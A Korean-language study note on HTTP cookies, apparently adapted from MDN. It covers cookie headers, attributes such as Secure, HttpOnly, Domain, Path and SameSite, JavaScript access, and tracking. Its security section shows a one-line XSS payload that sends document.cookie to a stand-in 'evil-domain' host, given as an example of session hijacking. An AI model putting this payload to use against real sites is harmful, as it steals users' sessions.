# HTTP 쿠키

## HTTP 쿠키란?

HTTP쿠키(웹 쿠키, 브라우저 쿠키)는 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각이다. 브라우저는 그 데이터 조각들을 저장해 놓았다가, 동일한 서버에 재 요청 시 저장된 데이터를 함께 전송한다. 쿠키는 두 요청이 동일한 브라우저에서 들어왔는지 아닌지를 판단할 때 주로 사용한다. 상태가 없는(stateless) HTTP 프로토콜에서 상태 정보를 기억시켜준다. 

## 쿠키의 목적

- 세션 관리(Session management)
  - 서버에 저장해야 할 로그인, 장바구니, 게임 스코어 등의 정보 관리
- 개인화(Personalization)
  - 사용자 선호, 테마 등의 세팅
- 트래킹(Tracking)
  - 사용자 행동을 기록하고 분석하는 용도

## 클라이언트 측의 데이터 저장

데이터를 클라이언트 측에 저장할 때 쿠키를 사용하던 과거와 달리 지금은 modern storage APIs를 사용할 것이 권장된다. 쿠키는 모든 요청마다 함께 전송되기 때문에 성능이 저하될 수 있기 때문이다.

## 저장된 쿠키 보기

- 개발자 도구 > Storage Inspector -> 스토리지 트리의 쿠키 스토리지

## 쿠키 만들기

### Set-Cookie 응답헤더와 Cookie 요청헤더

- 서버: 클라이언트야 쿠키 저장해!

```
Set-Cookie: 쿠키이름=쿠키값
Set-Cookie: 쿠키이름=쿠키값
```

- 브라우저: 서버로 이전에 저장했던 모든 쿠키들 회신

```
Cookie: 쿠키이름1=쿠키값1; 쿠키이름2=쿠키값2
```

### Session 쿠키와 Permanent 쿠키

`Expires`나 `Max-Age`를 명시하지 않을 경우 클라이언트가 종료되면 삭제되는 Session 쿠키가 된다.  명시하면 클라이언트가 닫힐 때 만료되지 않는 Permanent 쿠키가 된다.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; // Permanent 쿠키
```

### Secure 쿠키와 HttpOnly 쿠키

- 쿠키에 Secure 옵션을 줄 경우 Https 프로토콜 상에서 암호화된 요청일 경우만 전송된다.  
- HttpOnly 옵션을 줄 경우, 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 Cross-site 스크립팅 공격을 누그러뜨리는 데 도움을 줄 수 있다. 



### 쿠키의 스코프: Domain과 Path 속성

- `Domain`과 `Path` 디렉티브가 어떤 URL을 쿠키가 보내야 하는지 쿠키의 스코프를 정의한다. 특정 도메인 혹은 경로 제한 설정이 가능하다.
- `Domain`: 서브도메인 포함
  - 예를 들어, `Domain=naver.com`가 설정되면 쿠키들이 `dict.naver.com`, `news.naver.com`과 같은 서브 도메인 상에도 포함된다. 
- `Path`: 서브 디렉토리 포함
  - 예를 들어, `Path=/docs`가 설정되면 쿠키들이 `/docs`, `docs/Web/`, `docs/HTTP`와 같은 서브 디렉토리 상에도 포함된다.



### SameSite 쿠키

SameSite 쿠키는 쿠키가 cross-site 요청과 함께 전송되지 않게 함으로써`cross-site`요청 위조 공격으로부터 쿠키를 보호한다. 



### Document.cookie를 사용한 자바스크립트 접근

- `Document.cookie`를 사용해 쿠키를 만들어낼 수 있다. `HttpOnly`플래그가 설저어되지 않은 경우 기본 쿠키들은 자바스크립트로부터 잘 접근될 수 있다

```javascript
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy+cookie=choco; tasty_cookie=strawberry";
```



## 보안

### 세션 하이재킹과 XSS

쿠키는 인증된 사용자의 인증된 세션을 식별하기 위해 사용되는데, 이 쿠키를 가로채면 인증된 사용자의 세션 하이재킹으로 이어질 수 있다. 소셜 공학을 사용하거나 애플리케이션 내의 XSS 취약점을 이용하여 쿠키를 가로챌 수 있다.

```javascript
(new Image()).src = "https://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

쿠키에 `HttpOnly` 속성을 주면 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 공격을 누그러뜨리는 데 도움을 줄 수 있다.

### Cross-site 요청 위조 (CSRF)



## 트래킹과 프라이버시

### 서드파티 쿠키

설정한 서버에만 전송되는 퍼스트파티 쿠키와 달리, 서드파티 컴포넌트(웹을 통한 광고와 트래킹)를 통해 전송되는 쿠키를 말한다.

### Do-Not Track

- `DNT` 헤더: 트래킹 혹은 cross-site 사용자 트래킹 모두를 비활성화하는 신호로 사용될 수 있다.

### EU 쿠키 디렉티브

- EU 전역의 쿠키에 대한 요구사항.
- 누군가 어떤 정보든지 저장하거나 검색하기 전에, 사용자가 사전 동의를 해야만 한다. 웹사이트가 사용자에게 쿠키 사용에 대한 내용을 알려준 뒤에 배너를 추가할 수 있다.

### 좀비 쿠키와 Evercookies

- 좀비 쿠키: 삭제 이후에 다시 생성되는 쿠키
- Evercookies
- 의도적으로 영원히 제거하는 것이 어려운 쿠키
- 쿠키 존재 여부와 관계 없이 자신을 다시 만들어내기 위해 웹 스토리지 API, Flash 로컬 공유 객체 등을 사용하고 있다.



